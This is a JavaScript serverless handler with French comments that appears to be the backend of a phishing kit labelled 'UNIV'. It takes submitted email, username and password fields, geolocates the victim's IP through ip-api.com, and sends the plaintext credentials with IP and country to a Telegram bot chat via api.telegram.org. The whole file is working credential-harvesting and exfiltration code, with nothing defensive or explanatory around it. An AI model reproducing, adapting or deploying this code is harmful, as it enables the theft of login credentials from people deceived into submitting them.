export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Méthode non autorisée" });
  }

  try {
    const { usermail, user, pass } = req.body || {};

    if (!usermail || !user || !pass) {
      return res.status(400).json({ error: "Champs manquants" });
    }

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!botToken || !chatId) {
      return res.status(500).json({ error: "Configuration serveur incomplète (BOT_TOKEN / CHAT_ID manquants)" });
    }

    // Obtenir l'IP du client (dev local, ça peut être 127.0.0.1)
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress || "IP inconnue";

    // Option : récupérer pays via ip-api (attention http)
    let country = "Inconnu";
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
      if (geoRes.ok) {
        const geoData = await geoRes.json();
        if (geoData?.country) country = geoData.country;
      }
    } catch (e) {
      // ignore
      console.warn("Erreur géo:", e && e.message);
    }

    // Construire le message (texte)
    const message = `📩 Nouveau Formulaire (UNIV)
📧 EMaIl: ${usermail}
🆔 Ident: ${user}
🔑 MDePass: ${pass}
🌍 IP: ${ip} (${country})`;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });

    if (!telegramResponse.ok) {
      const text = await telegramResponse.text();
      console.error("Erreur Telegram:", text);
      return res.status(502).json({ error: "Échec d'envoi à Telegram", details: text });
    }

    // Réponse au client
    return res.status(200).json({ success: true, message: "Message envoyé à Telegram (test local)" });

  } catch (error) {
    console.error("Erreur serveur :", error);
    return res.status(500).json({ error: "Erreur serveur", details: String(error) });
  }
}
